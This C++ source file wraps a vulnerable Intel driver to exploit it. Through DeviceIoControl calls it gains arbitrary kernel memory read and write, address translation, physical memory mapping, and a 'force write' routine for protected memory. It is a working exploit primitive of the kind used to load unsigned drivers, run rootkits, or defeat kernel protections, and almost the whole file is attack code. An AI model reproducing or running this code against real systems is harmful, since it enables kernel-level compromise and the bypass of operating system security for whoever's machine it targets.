#include "shittel_driver.h"

namespace kernel::intel
{
	intel_vulnerable_driver::intel_vulnerable_driver() : kernel::vulnerable_driver(driver_device_name)
	{
		if (driver_handle == INVALID_HANDLE_VALUE)
		{
			std::cout << "[-] Failed to open handle to Intel Vulnerable Driver" << std::endl;
		}
		else
		{
			std::cout << "[+] Successfully opened handle to Intel Vulnerable Driver" << std::endl;
		}
	}
	bool intel_vulnerable_driver::driver_read_primitive(uint64_t address, void* buffer, uint64_t buffer_size)
	{
		return intel_copy_memory(reinterpret_cast<uint64_t>(buffer), reinterpret_cast<void*>(address), buffer_size);
	}

	bool intel_vulnerable_driver::driver_write_primitive(uint64_t address, void* buffer, uint64_t buffer_size)
	{
		return intel_copy_memory(address, buffer, buffer_size);
	}

	bool intel_vulnerable_driver::driver_force_write(uint64_t address, void* buffer, uint64_t buffer_size)
	{
		if (address == 0 || buffer == nullptr || buffer_size == 0)
			return false;

		uint64_t physical_address = intel_rva_to_physical(address);

		if (physical_address == 0)
		{
			std::cerr << "[-] Failed to translate virtual address 0x" << std::hex << address << std::dec << std::endl;
			return false;
		}

		//Map our physical memory space into our processes virtual address space
		const uint64_t mapped_physical_address = intel_map_physical(address, buffer_size);

		if (mapped_physical_address == 0)
		{
			std::cerr << "[-] Failed to map physical address 0x" << std::hex << physical_address << std::dec << " into our processes' virtual memory space" << std::endl;
			return false;
		}

		bool success = driver_write_primitive(mapped_physical_address, buffer, buffer_size);

		if (!intel_unmap_physical(mapped_physical_address, buffer_size))
		{
			std::cerr << "[-] Failed to unmap physical address space from virtual memory!" << std::endl;
			return false;
		}

		return success;
	}

	uint64_t intel_vulnerable_driver::allocate_kernel_pool(POOL_TYPE pool_type, uint64_t pool_size)
	{
		return uint64_t();
	}

	bool intel_vulnerable_driver::free_kernel_pool(uint64_t address)
	{
		return false;
	}

	uint64_t intel_vulnerable_driver::intel_map_physical(uint64_t address, uint32_t size)
	{
		if (address == 0 || size == 0)
			return 0;

		INTEL_MAP_IO_SPACE_BUFFER_INFO map_io_buffer = { 0 };
		map_io_buffer.case_number = instruction_case_number::MAP_PHYSICAL_ADDRESS;
		map_io_buffer.physical_address_to_map = address;
		map_io_buffer.size = size;

		DWORD bytes_returned = 0;

		if (!DeviceIoControl(driver_handle, ioctl::TARGET_ICTL, &map_io_buffer, sizeof(INTEL_MAP_IO_SPACE_BUFFER_INFO), nullptr, 0, &bytes_returned, 0))
			return 0;

		return map_io_buffer.return_virtual_address;
	}

	bool intel_vulnerable_driver::intel_unmap_physical(uint64_t address, uint32_t size)
	{
		if (address == 0 || size == 0)
			return false;

		INTEL_UNMAP_IO_SPACE_BUFFER_INFO unmap_io_buffer = { 0 };
		unmap_io_buffer.case_number = instruction_case_number::UNMAP_PHYSICAL_ADDRESS;
		unmap_io_buffer.virt_address = address;
		unmap_io_buffer.number_of_bytes = size;

		DWORD bytes_returned = 0;

		return DeviceIoControl(driver_handle, ioctl::TARGET_ICTL, &unmap_io_buffer, sizeof(INTEL_UNMAP_IO_SPACE_BUFFER_INFO), nullptr, 0, &bytes_returned, 0);

	}

	uint64_t intel_vulnerable_driver::intel_rva_to_physical(uint64_t address)
	{
		INTEL_TRANSLATE_VIRTUAL_ADDRESS_INFO translate_info = { 0 };
		translate_info.case_number = instruction_case_number::TRANSLATE_RVA_TO_PHYSICAL;
		translate_info.target_rva = address;

		DWORD bytes_read = 0;

		if (!DeviceIoControl(driver_handle, ioctl::TARGET_ICTL, &translate_info, sizeof(translate_info), nullptr, 0, &bytes_read, nullptr))
			return 0x0;

		return translate_info.translated_physical;
	}

	bool intel_vulnerable_driver::intel_copy_memory(uint64_t destination, void* source, size_t size)
	{
		INTEL_COPY_MEMORY_BUFFER_INFO copy_buffer_info = { 0 };
		copy_buffer_info.case_number = instruction_case_number::COPY_MEMORY_BUFFER_INFO;
		copy_buffer_info.source = reinterpret_cast<uint64_t>(source);
		copy_buffer_info.destination = destination;
		copy_buffer_info.length = size;

		DWORD bytes_returned = 0;

		return DeviceIoControl(driver_handle, ioctl::TARGET_ICTL, &copy_buffer_info, sizeof(copy_buffer_info), nullptr, 0, &bytes_returned, nullptr);
	}
}
